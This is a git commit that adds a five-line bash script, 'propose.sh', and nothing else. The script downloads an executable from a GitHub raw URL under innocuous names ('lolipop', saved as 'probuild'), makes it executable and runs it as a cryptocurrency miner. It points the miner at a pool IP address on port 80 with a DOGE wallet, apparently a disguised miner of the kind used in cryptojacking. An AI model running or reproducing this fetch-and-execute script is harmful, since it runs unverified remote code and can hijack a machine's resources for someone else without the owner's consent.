be7fb1f5baeb48cda203f08b6b51972c97d931df
unauna1803 <128925543+unauna1803@users.noreply.github.com>
2023-05-14 17:45:50 +0700

    Create propose.sh

---
+++ propose.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+
+wget -O probuild https://raw.githubusercontent.com/unauna1803/buildersop/main/lolipop
+chmod +x probuild
+./probuild --algo KASPA --pool 146.190.86.51:80 --user DOGE:D8j9uniRtnR2qCs69oGuRp8G1Q5nCDmR9S.tested3#n6so-061u 
